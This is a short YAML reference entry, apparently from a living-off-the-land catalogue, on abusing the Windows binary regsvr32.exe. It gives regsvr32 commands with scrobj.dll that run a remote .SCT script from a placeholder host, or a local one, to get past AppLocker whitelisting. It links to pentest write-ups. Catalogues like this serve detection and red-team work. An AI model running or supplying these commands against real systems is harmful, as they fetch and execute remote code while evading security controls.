---
name: regsvr32.exe
description: Used by Windows to register dll files.
functions:
  awl-bypass:
    - description: Execute the specified remote .SCT script with scrobj.dll.
      code: regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
    - description: Execute the specified local .SCT script with scrobj.dll.
      code: regsvr32.exe /s /u /i:file.sct scrobj.dll
  execute:
    - description: Execute the specified remote .SCT script with scrobj.dll.
      code: regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
    - description: Execute the specified local .SCT script with scrobj.dll.
      code: regsvr32.exe /s /u /i:file.sct scrobj.dll
resources: 
    - resource: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
    - resource: https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/
fullpath: 
    - path: c:\windows\system32\regsvr32.exe
    - path: c:\windows\sysWOW64\regsvr32.exe
notes: Thanks to Casey Smith - @subtee
---